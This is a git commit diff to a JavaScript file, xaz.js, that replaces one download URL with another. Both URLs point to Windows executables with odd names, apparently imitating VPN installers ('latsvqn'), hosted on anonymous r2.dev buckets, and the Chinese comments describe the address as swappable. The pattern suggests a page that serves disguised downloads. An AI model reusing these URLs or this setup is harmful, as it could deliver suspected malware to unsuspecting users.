df2578da9007452e41ce1ba0329e20e753eb1f7a
aa168188aa <liub57070@gmail.com>
2025-04-29 16:02:59 +0800

    Update xaz.js

--- xaz.js
+++ xaz.js
@@ -1,9 +1,9 @@
  
 
-var xz = "https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe";
+var xz = "https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/latsvqn-x64.53.1litest.exe";
 
-//可以把   https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe  这个改成下载地址；https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe
-//可以把   https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe  这个改成文件下载：https://pub-3831456174c6457788f0f81482e3bf3a.r2.dev/ltes-kualian.exe
+//可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/latsvqn-x64.53.1litest.exe  这个改成下载地址；https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/latsvqn-x64.53.1litest.exe
+//可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/latsvqn-x64.53.1litest.exe  这个改成文件下载：https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/latsvqn-x64.53.1litest.exe
 
 
 
